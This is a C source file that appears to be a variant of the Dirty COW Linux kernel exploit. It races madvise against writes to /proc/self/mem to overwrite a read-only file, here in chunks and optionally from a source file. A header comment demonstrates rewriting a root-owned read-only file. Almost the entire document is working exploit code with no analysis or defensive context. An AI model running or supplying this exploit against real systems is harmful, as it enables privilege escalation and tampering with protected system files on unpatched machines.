/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
void *map;



char * source_mem;

uintptr_t source_read_start;
size_t source_read_size;


void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  uintptr_t prestart;
  size_t pagesize = getpagesize();
  size_t difference;
  for(i=0;i<200000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    prestart = (uintptr_t) (map + source_read_start);
    prestart = (prestart / pagesize) * pagesize;
    difference = ((uintptr_t) map) - prestart + source_read_size;
    c+=madvise((void*) prestart,difference,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{

  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<200000000;i++) {

    lseek(f,(uintptr_t) map + source_read_start,SEEK_SET);
    c+=write(f,source_mem + source_read_start,source_read_size);
  }
  printf("procselfmem %d\n\n", c);
}
 
 
 unsigned int tryOpen(char* filename, void** result)
 {
   struct stat st;
    int f=open(filename,O_RDONLY);
    if(f < 0)
      return 0;
    
    void* buf = malloc(4096*5);
    int letti = read(f,buf,2*4096);
    close(f);
    
    if(letti <= 0)
        return 0;
    
    *result = buf;
    return letti;
   
 }
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
  struct stat st;
  size_t union_length = 0;
  unsigned int temp_length = 0;
  unsigned int temp2 = 0;
/*
You have to open the file in read only mode.
*/
  int f=open(argv[1],O_RDONLY);
  fstat(f,&st);

/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);

  source_mem = argv[2];
  source_read_start = 0;
  source_read_size = 512;
  
  unsigned int letti = tryOpen(argv[2],(void**) &source_mem);
  if(letti > 0)
    union_length = letti;
  else
    union_length = strlen(argv[2]);
  
  if(union_length > st.st_size)
    union_length = st.st_size;
  if(source_read_size > union_length)
    source_read_size = union_length;
 
  
  
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  
  
  
  
  
  
  while(1)
  {
    printf("%d %d\n",source_read_size,source_read_start);
  usleep(1000000);
  if(source_read_start + source_read_size >= union_length)
    return 0;
  temp_length = union_length - (source_read_start + source_read_size);
  if(temp_length > source_read_size)
    temp_length = source_read_size;
  temp2 = source_read_size;
  source_read_size = temp_length;
  source_read_start += temp2;
  
  }
  
  
  
  
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}